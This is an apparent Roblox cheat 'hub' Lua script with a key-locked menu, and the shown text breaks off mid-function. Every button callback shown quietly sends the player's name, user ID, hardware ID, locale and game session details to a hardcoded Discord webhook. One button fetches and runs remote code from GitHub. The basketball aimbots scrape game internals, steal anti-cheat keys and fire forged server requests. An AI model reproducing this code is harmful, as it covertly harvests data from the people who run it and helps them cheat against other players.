local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Shots Hub (By Shots Dunkx)",
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "Rayfield Interface Suite",
    LoadingSubtitle = "by Sirius",
    Theme = "Bloom", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
 
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil, -- Create a custom folder for your hub/game
       FileName = "Shots Hub"
    },
 
    Discord = {
       Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
       Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
 
    KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
       Note = "join discord.gg/", -- Use this to tell the user how to get a key
       FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"H1KbYIxHcZdb7isO6NErDmA6SNv3zg"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })

 local Tab = Window:CreateTab("Fisch", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Fisch",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/RSenix3/PrestineHub/refs/heads/main/PrestineHubV3.5"))()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1345905531004518440/-Yx_rSGS7MN91SUGyWsSJNJQWxvAkx3ZbBpvflhD0TCp20fFyJyoUqEljDpNklphfXCX"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
-- Function to calculate in-game time since the script was executed
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed fisch.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Country",
                ["value"] = playerCountry,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

    end,
 })

 local Tab = Window:CreateTab("Phenom", 4483362458) -- Title, Image

 local Button = Tab:CreateButton({
    Name = "Camlock",
    Callback = function()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1345905531004518440/-Yx_rSGS7MN91SUGyWsSJNJQWxvAkx3ZbBpvflhD0TCp20fFyJyoUqEljDpNklphfXCX"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
-- Function to calculate in-game time since the script was executed
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed phenom.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Country",
                ["value"] = playerCountry,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

        local Player = game.Players.LocalPlayer
        local Camera = workspace.CurrentCamera
        Holding = false
        e = false
        isdoing = false
        function findGoals()
        for i, v in pairs(workspace:GetDescendants()) do
        if v.Name == 'Goal' then
        v.Parent = workspace
        end
        end
        end
        local function findClosestPart(position)
           local closestPart, closestPartMagnitude
           local tmpMagnitude
           for i, v in pairs(workspace:GetChildren()) do
               if v.Name == 'Goal' then
                   if closestPart then
                       tmpMagnitude = (position - v.Position).magnitude
                       if tmpMagnitude < closestPartMagnitude then
                           closestPart = v
                           closestPartMagnitude = tmpMagnitude
                       end
                   else
                       closestPart = v
                       closestPartMagnitude = (position - v.Position).magnitude
                   end
               end
           end
           return closestPart
        end
        --//vb
        local player = game.Players.LocalPlayer
        local camera = game.Workspace.CurrentCamera
        local character = player.Character
        local head = character.Head
        local torso = character.Torso
        findGoals()
        local function cam()
           while wait() do
               if isdoing == true then
                 local pos = head.Position
             local partyGoal = findClosestPart(head.Position)
             local lookAt = partyGoal.Position + Vector3.new(0,90,0)
             local mag = (character.PrimaryPart.Position - partyGoal.Position).magnitude
             local cameraCFrame = CFrame.new(pos, lookAt)
             Camera.CFrame = cameraCFrame
             else
                 return nil
             end
           end
           end
        
        game.Players.LocalPlayer.Character.ChildAdded:Connect(function(child)
        local pv = game.Players.LocalPlayer.Character.Basketball
        local UIS = game:GetService('UserInputService')
        
        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Jumping:Connect(function()
            isdoing = true
            if game.Players.LocalPlayer.Character.Basketball then
                   local lookthat = findClosestPart(game.Players.LocalPlayer.Character.Torso.Position)
               local pvm = (lookthat.Position - game.Players.LocalPlayer.Character.Torso.Position).magnitude
               if pvm >= 30  then
                   if pvm <=44 then
                       pv.PowerValue.Value = 75
                      cam()
                 end
               end
                   local lookthat = findClosestPart(game.Players.LocalPlayer.Character.Torso.Position)
               local pvm = (lookthat.Position - game.Players.LocalPlayer.Character.Torso.Position).magnitude
               if pvm >= 45  then
                   if pvm <=53 then
                       pv.PowerValue.Value = 80
                      cam()
                 end
               end
        local lookthat = findClosestPart(game.Players.LocalPlayer.Character.Torso.Position)
               local pvm = (lookthat.Position - game.Players.LocalPlayer.Character.Torso.Position).magnitude
               if pvm >= 54  then
                   if pvm <=66 then
                        pv.PowerValue.Value = 85
                      cam()
               
                 end
               end
                   local lookthat = findClosestPart(game.Players.LocalPlayer.Character.Torso.Position)
               local pvm = (lookthat.Position - game.Players.LocalPlayer.Character.Torso.Position).magnitude
               if pvm >= 67  then
                   if pvm <=76 then
        pv.PowerValue.Value = 90
                      cam()
                         
               
                 end
        end
                   local lookthat = findClosestPart(game.Players.LocalPlayer.Character.Torso.Position)
               local pvm = (lookthat.Position - game.Players.LocalPlayer.Character.Torso.Position).magnitude
               if pvm >= 77  then
                   if pvm <=84 then
                       pv.PowerValue.Value = 95
                      cam()
                   
        end
        end
        local lookthat = findClosestPart(game.Players.LocalPlayer.Character.Torso.Position)
        local pvm = (lookthat.Position - game.Players.LocalPlayer.Character.Torso.Position).magnitude
        if pvm >= 85  then
        if pvm <=91 then
        pv.PowerValue.Value = 100
        cam()
                       
               
        end
        end
        end
        end)
        end)
        
        local UIS = game:service('UserInputService')
        UIS.InputBegan:connect(function(l)
        if l.UserInputType == Enum.UserInputType.MouseButton1 then
        isdoing = false
        end
        end)
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Bounce Bot",
    Callback = function()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1345905531004518440/-Yx_rSGS7MN91SUGyWsSJNJQWxvAkx3ZbBpvflhD0TCp20fFyJyoUqEljDpNklphfXCX"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
-- Function to calculate in-game time since the script was executed
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed phenom.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Country",
                ["value"] = playerCountry,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

        local S, E = pcall(function()
            _G.Stepped:Disconnect()
            _G.InputBegan:Disconnect()
        end)
        
        if S then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Silent Aim",
                Text = "Silent Aim was reset, Mode: BounceBot",
                Duration = 3
            })
        
            _G.Stepped = nil
            _G.InputBegan = nil
        end
        
        if game.PlaceId == 4923146720 then
            return game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Error",
                Text = "BounceBot can't be used in Playground",
                Duration = 5,
                Button1 = "Ok"
            })
        end
        
        local Player = game.Players.LocalPlayer
        local UIS = game:GetService("UserInputService")
        local RS = game:GetService("RunService")
        
        local IsInFooting = false
        
        local HL = Instance.new("Highlight")
        HL.Enabled = false
        HL.Adornee = Player.Character
        HL.FillColor = Color3.fromRGB(25, 255, 25)
        HL.OutlineColor = Color3.fromRGB(0, 255, 0)
        HL.Parent = game.CoreGui
        
        local XYZ = {"X1", "Y1", "Z1", "X2", "Y2", "Z2"}
        local Selected; for _, Garbage in next, getgc(true) do
            if type(Garbage) == "function" and getinfo(Garbage)["name"] == "selected1" then
                Selected = Garbage
            end
        end
        local Goals = {}; for _, Obj in next, workspace:GetDescendants() do
            if Obj.Name == "Goal" and Obj:isA("BasePart") then
                table.insert(Goals, Obj)
            end
        end
        local Shuffled = {}; for _, Garbage in next, getgc(true) do
            if type(Garbage) == "table" and rawget(Garbage, "1") and rawget(Garbage, "1") ~= true then
                for z,x in next, Garbage do
                    Shuffled = Garbage
                end
            end
        end
        
        local Clicker = getupvalue(Selected, 3)
        
        local GetKeyFromKeyTable = function()
            local Keys = getupvalue(Selected, 4)
            return Keys[1]
        end
        
        local RemoveKeyFromKeyTable = function()
            local Keys = getupvalue(Selected, 4)
            table.remove(Keys, 1)
            setupvalue(Selected, 4, Keys)
        end
        
        local GetRandomizedTable = function(TorsoPosition, ShootPosition)
            local UnrandomizedArgs = {
                X1 = TorsoPosition.X,
                Y1 = TorsoPosition.Y,
                Z1 = TorsoPosition.Z,
                X2 = ShootPosition.X,
                Y2 = ShootPosition.Y,
                Z2 = ShootPosition.Z
            }
            
            local RandomizedArgs = {
                UnrandomizedArgs[Shuffled["1"]],
                UnrandomizedArgs[Shuffled["2"]],
                UnrandomizedArgs[Shuffled["3"]],
                UnrandomizedArgs[Shuffled["4"]],
                UnrandomizedArgs[Shuffled["5"]],
                UnrandomizedArgs[Shuffled["6"]],
            }
            
            return RandomizedArgs
        end
        
        local GetCorrectPosition = function(Position)
            return Position - Player.Character.Torso.Position
        end
        
        local GetUnitPosition = function(Position)
            return Position.Unit
        end
        
        local GetGoal = function()
            local Distance, Goal = 9e9;
            
            for _, Obj in next, Goals do
                local Magnitude = (Player.Character.Torso.Position - Obj.Position).Magnitude
                
                if Distance > Magnitude then
                    Distance = Magnitude
                    Goal = Obj
                end
            end
            
            return Goal
        end
        
        local GetDistance = function()
            local Goal = GetGoal()
            
            return (Player.Character.Torso.Position - Goal.Position).Magnitude
        end
        
        local GetBasketball = function()
             return Player.Character:FindFirstChildOfClass("Folder") 
        end
        
        local InFootingCheck = function()
            local Distance = GetDistance()
            local Basketball = GetBasketball()
            
            local Power; if Basketball ~= nil then
                Power = Basketball.PowerValue.Value
            else
                IsInFooting = false
                return
            end
            
            if Distance > 57 and Distance < 93 then
                IsInFooting = true
            else
                IsInFooting = false
            end
        end
        
        local GetArc = function()
            local Distance = GetDistance()
            local Basketball = GetBasketball()
            
            if Distance > 57 and Distance < 63 then
                return 185
            elseif Distance > 63 and Distance < 69 then
                return 180
            elseif Distance > 69 and Distance < 74 then
                return 175
            elseif Distance > 74 and Distance < 79 then
                return 175
            elseif Distance > 79 and Distance < 82 then
                return 170
            elseif Distance > 82 and Distance < 91 then
                return 165
            elseif Distance > 91 and Distance < 93 then
                return 160
            end
        end
        
        local Shoot = function()
            local Goal = GetGoal()
            local Arc = GetArc()
            local CorrectPosition = GetCorrectPosition(Goal.Position + Vector3.new(0, Arc, 0) + Player.Character.Humanoid.MoveDirection)
            local Position = GetUnitPosition(CorrectPosition)
            local RandomizedArgs = GetRandomizedTable(Player.Character.Torso.Position, Position)
            local Basketball = GetBasketball()
            
            local Key = GetKeyFromKeyTable()
            
            if type(Key) ~= "string" then
                Key = "Shotta"
            end
            
            Clicker:FireServer(Basketball, 100, RandomizedArgs, Key)
            
            if Key ~= "Shotta" then
                RemoveKeyFromKeyTable()
            end
        end
                    
        _G.InputBegan = UIS.InputBegan:Connect(function(Key, GPE)
            if not GPE and Key.KeyCode == Enum.KeyCode.X and Player.Character and Player.Character:FindFirstChild("Basketball") and IsInFooting then
                if Player.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
                    Player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    task.wait(0.27)
                end
                
                Shoot()
            end
        end)
        
        _G.Stepped = RS.Stepped:Connect(function()
            InFootingCheck()
            
            if IsInFooting then
                HL.Enabled = true
            else
                HL.Enabled = false
            end
            
            if HL.Adornee.Parent == nil and Player.Character then
                HL.Adornee = Player.Character
            end
        end)
    end,
 })

 
 local Button = Tab:CreateButton({
    Name = "No Jump Bot",
    Callback = function()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1345905531004518440/-Yx_rSGS7MN91SUGyWsSJNJQWxvAkx3ZbBpvflhD0TCp20fFyJyoUqEljDpNklphfXCX"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
-- Function to calculate in-game time since the script was executed
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed phenom.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Country",
                ["value"] = playerCountry,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

        local S, E = pcall(function()
            _G.Stepped:Disconnect()
            _G.InputBegan:Disconnect()
        end)
        
        if S then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Silent Aim",
                Text = "Silent Aim was reset, Mode: NoJumpBot",
                Duration = 3
            })
        
            _G.Stepped = nil
            _G.InputBegan = nil
        end
        
        local Player = game.Players.LocalPlayer
        local UIS = game:GetService("UserInputService")
        local RS = game:GetService("RunService")
        
        local Playground = (game.PlaceId == 4923146720)
        local IsInFooting = false
        
        local HL = Instance.new("Highlight")
        HL.Enabled = false
        HL.Adornee = Player.Character
        HL.FillColor = Color3.fromRGB(25, 255, 25)
        HL.OutlineColor = Color3.fromRGB(0, 255, 0)
        HL.Parent = game:GetService("CoreGui")
        
        local Goals = {} do
            for _, Obj in next, game:GetDescendants() do
                if Obj.Name == "Goal" and Obj:IsA("BasePart") then
                    table.insert(Goals, Obj)
                elseif Obj.Name == "Part" and Obj:IsA("BasePart") and Obj.Size == Vector3.new(5, 1, 5) then
                    table.insert(Goals, Obj)
                end
            end
        end
        
        local Shuffled, Selected do
            for _, Garbage in next, getgc(true) do
                if type(Garbage) == "function" and getinfo(Garbage)["name"] == "selected1" then
                    Selected = Garbage
                elseif type(Garbage) == "table" and rawget(Garbage, "1") and rawget(Garbage, "1") ~= true then
                    Shuffled = Garbage
                end
            end
        end
        
        local Clicker do
            if Playground == false then
                Clicker = getupvalue(Selected, 3)
            else
                Clicker = getupvalue(Selected, 5)
            end
        end
        
        local GetClock = function()
            local OldClock = getupvalue(Selected, 3)
            local NewClock = OldClock + 1
            
            setupvalue(Selected, 3, NewClock)
            
            return NewClock
        end
        
        local GetKeyFromKeyTable = function()
            local Keys = getupvalue(Selected, 4)
            
            if Playground == true then
                return "Shotta_"
            elseif type(Keys[1]) == "string" then
                return Keys[1]
            end
            
            return "Shotta"
        end
        
        local RemoveKeyFromKeyTable = function()
            local Keys = getupvalue(Selected, 4)
            
            if type(Keys) == "table" then
                table.remove(Keys, 1)
                setupvalue(Selected, 4, Keys)
            end
        end
        
        local GetRandomizedTable = function(TorsoPosition, ShootPosition)
            local UnrandomizedArgs = {
                X1 = TorsoPosition.X,
                Y1 = TorsoPosition.Y,
                Z1 = TorsoPosition.Z,
                X2 = ShootPosition.X,
                Y2 = ShootPosition.Y,
                Z2 = ShootPosition.Z
            }
            
            local RandomizedArgs = {
                UnrandomizedArgs[Shuffled["1"]],
                UnrandomizedArgs[Shuffled["2"]],
                UnrandomizedArgs[Shuffled["3"]],
                UnrandomizedArgs[Shuffled["4"]],
                UnrandomizedArgs[Shuffled["5"]],
                UnrandomizedArgs[Shuffled["6"]],
            }
            
            return RandomizedArgs
        end
        
        local GetGoal = function()
            local Distance, Goal = 9e9
            
            for _, Obj in next, Goals do
                local Magnitude = (Player.Character.Torso.Position - Obj.Position).Magnitude
                
                if Distance > Magnitude then
                    Distance = Magnitude
                    Goal = Obj
                end
            end
            
            return Goal
        end
        
        local GetDistance = function()
            local Goal = GetGoal()
            
            return (Player.Character.Torso.Position - Goal.Position).Magnitude
        end
        
        local GetDirection = function(Position)
            return (Position - Player.Character.Torso.Position).Unit
        end
        
        local GetBasketball = function()
            return Player.Character:FindFirstChildOfClass("Folder")
        end
        
        local InFootingCheck = function()
            local Distance = GetDistance()
            local Basketball = GetBasketball()
            
            local Power do 
                if Basketball ~= nil then
                    Power = Basketball.PowerValue.Value
                else
                    IsInFooting = false
                    return
                end
            end
            
            if Player.Character ~= nil then
                if Player.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Running then
                    IsInFooting = false
                    return
                end
            else
                IsInFooting = false
                return
            end
            
            if Power == 80 then
                if Distance > 57 and Distance < 64 then
                    IsInFooting = true
                else
                    IsInFooting = false
                    end
            elseif Power == 85 then
                if Distance > 57 and Distance < 70 then
                    IsInFooting = true
                else
                    IsInFooting = false
                    end
            elseif Power == 90 then
                if Distance > 57 and Distance < 74 then
                    IsInFooting = true
                else
                    IsInFooting = false
                end
            elseif Power == 95 then
                if Distance > 57 and Distance < 82 then
                    IsInFooting = true
                else
                    IsInFooting = false
                end
            elseif Power == 100 then
                if Distance > 57 and Distance < 87 then
                    IsInFooting = true
                else
                    IsInFooting = false
                end
            elseif Power < 80 then
                IsInFooting = false
            end
        end
        
        local GetArc = function()
            local Distance = GetDistance()
            local Basketball = GetBasketball()
            
            local Arc = nil
            
            local Power do
                if Basketball ~= nil then
                    Power = Basketball.PowerValue.Value
                else
                    return
                end
            end
            
            if Power == 80 then
                if Distance > 57 and Distance < 59 then
                    Arc = 60
                elseif Distance > 59 and Distance < 62 then
                    Arc = 55
                elseif Distance > 62 and Distance < 64 then
                    Arc = 40
                end
            elseif Power == 85 then
                if Distance > 57 and Distance < 59 then
                    Arc = 75
                elseif Distance > 59 and Distance < 63 then
                    Arc = 70
                elseif Distance > 63 and Distance < 66 then
                    Arc = 65
                elseif Distance > 66 and Distance < 69 then
                    Arc = 55
                elseif Distance > 69 and Distance < 70 then
                    Arc = 45
                end
            elseif Power == 90 then
                if Distance > 57 and Distance < 63 then
                    Arc = 90
                elseif Distance > 63 and Distance < 66 then
                    Arc = 85
                elseif Distance > 66 and Distance < 69 then
                    Arc = 80
                elseif Distance > 69 and Distance < 73 then
                    Arc = 70
                elseif Distance > 73 and Distance < 74 then
                    Arc = 65
                end
            elseif Power == 95 then
                if Distance > 57 and Distance < 59 then
                    Arc = 110
                elseif Distance > 59 and Distance < 63 then
                    Arc = 105
                elseif Distance > 63 and Distance < 66 then
                    Arc = 100
                elseif Distance > 66 and Distance < 70 then
                    Arc = 95
                elseif Distance > 70 and Distance < 73 then
                    Arc = 90
                elseif Distance > 73 and Distance < 76 then
                    Arc = 85
                elseif Distance > 76 and Distance < 78 then
                    Arc = 80
                elseif Distance > 78 and Distance < 81 then
                    Arc = 65
                elseif Distance > 81 and Distance < 82 then
                    Arc = 60
                end
            elseif Power == 100 then
                if Distance > 57 and Distance < 66 then
                    Arc = 120
                elseif Distance > 66 and Distance < 69 then
                    Arc = 115
                elseif Distance > 69 and Distance < 73 then
                    Arc = 110
                elseif Distance > 73 and Distance < 77 then
                    Arc = 105
                elseif Distance > 77 and Distance < 80 then
                    Arc = 100
                elseif Distance > 80 and Distance < 82 then
                    Arc = 95
                elseif Distance > 82 and Distance < 84 then
                    Arc = 90
                elseif Distance > 84 and Distance < 85 then
                    Arc = 85
                elseif Distance > 85 and Distance < 87 then
                    Arc = 75
                end
            end
            
            print(Arc)
            
            if Playground == true and Arc ~= nil then
                Arc = Arc - 3
            end
            
            return Arc
        end
        
        local Shoot = function()
            local Goal = GetGoal()
            local Arc = GetArc()
            local Hit = (Goal.Position + Vector3.new(0, Arc, 0) + Player.Character.Humanoid.MoveDirection)
            local Direction = GetDirection(Hit)
            local RandomizedArgs = GetRandomizedTable(Player.Character.Torso.Position, Direction)
            local Basketball = GetBasketball()
            local Key = GetKeyFromKeyTable()
            
            if Playground == true then
                local Clock = GetClock()
                
                Key = Key .. Clock
            end
            
            Clicker:FireServer(Basketball, Basketball.PowerValue.Value, RandomizedArgs, Key)
            
            RemoveKeyFromKeyTable()
        end
        
        _G.InputBegan = UIS.InputBegan:Connect(function(Key, GPE)
            if not GPE and Key.KeyCode == Enum.KeyCode.X and Player.Character and Player.Character:FindFirstChild("Basketball") and IsInFooting then
                Shoot()
            end
        end)
        
        _G.Stepped = RS.Stepped:Connect(function()
            InFootingCheck()
            
            if IsInFooting then
                HL.Enabled = true
            else
                HL.Enabled = false
            end
            
            if HL.Adornee.Parent == nil and Player.Character then
                HL.Adornee = Player.Character
            end
        end)
    end,
 })

 
 
 local Button = Tab:CreateButton({
    Name = "Normal Silent",
    Callback = function()
        local HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1345905531004518440/-Yx_rSGS7MN91SUGyWsSJNJQWxvAkx3ZbBpvflhD0TCp20fFyJyoUqEljDpNklphfXCX"
 
local player = game.Players.LocalPlayer
local playerName = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local accountAge = player.AccountAge
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-- Additional Information
local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local playerCountry = game:GetService("LocalizationService").SystemLocaleId
local platform = player.OsPlatform or "Unknown"
local startTime = tick()
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
 
-- Function to calculate in-game time since the script was executed
local function getInGameTime()
    return math.floor(tick() - startTime) .. " seconds"
end
 
local payload = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "**Script Execution Notification**",
        ["description"] = displayName .. " (" .. playerName .. ") has executed phenom.",
        ["type"] = "rich",
        ["color"] = tonumber(0xffffff),
        ["fields"] = {
            {
                ["name"] = "User ID",
                ["value"] = userId,
                ["inline"] = true
            },
            {
                ["name"] = "Display Name",
                ["value"] = displayName,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = accountAge .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Premium Member",
                ["value"] = premiumStatus,
                ["inline"] = true
            },
            {
                ["name"] = "Hardware ID",
                ["value"] = hwid,
                ["inline"] = true
            },
            {
                ["name"] = "Country",
                ["value"] = playerCountry,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
            {
                ["name"] = "In-Game Time",
                ["value"] = getInGameTime(),
                ["inline"] = true
            },
            {
                ["name"] = "Place ID",
                ["value"] = placeId,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = gameName,
                ["inline"] = true
            },
            {
                ["name"] = "Job ID",
                ["value"] = jobId,
                ["inline"] = true
            }
        }
    }}
}
 
http_request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(payload)
})

        local S, E = pcall(function()
            _G.Stepped:Disconnect()
            _G.InputBegan:Disconnect()
        end)
        
        if S then
            game.StarterGui:SetCore("SendNotification", {
                Title = "Silent Aim",
                Text = "Silent Aim was reset, Mode: Normal Aimbot",
                Duration = 3
            })
        
            _G.Stepped = nil
            _G.InputBegan = nil
        end
        
        local Player = game.Players.LocalPlayer
        local UIS = game:GetService("UserInputService")
        local RS = game:GetService("RunService")
        
